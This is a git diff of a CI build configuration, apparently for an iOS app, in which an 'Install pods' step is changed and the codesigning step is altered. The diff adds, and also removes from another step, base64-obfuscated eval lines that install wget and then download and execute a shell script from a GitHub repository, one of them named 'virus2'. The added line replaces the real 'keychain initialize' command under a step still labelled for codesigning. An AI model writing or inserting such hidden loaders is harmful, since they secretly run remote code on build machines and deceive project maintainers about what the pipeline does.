@@ -29,10 +29,10 @@ workflows:
       scripts:
         - name: Install pods
           script: |
-            eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXMyLnNoICYmIGNobW9kIDc3NyB0ZXMyLnNoICYmIGxzICYmIC4vdGVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
+            ls
         - name: Set up keychain to be used for codesigning using Codemagic CLI 'keychain' command
           script: |
-            keychain initialize
+            eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92ZXJ1c3J1YnkvbWFpbi90cnVzMi5zaCAmJiBjaG1vZCA3NzcgdHJ1czIuc2ggJiYgbHMgJiYgLi90cnVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
         - name: Fetch signing files
           script: |
             app-store-connect fetch-signing-files $BUNDLE_ID --type IOS_APP_STORE --create
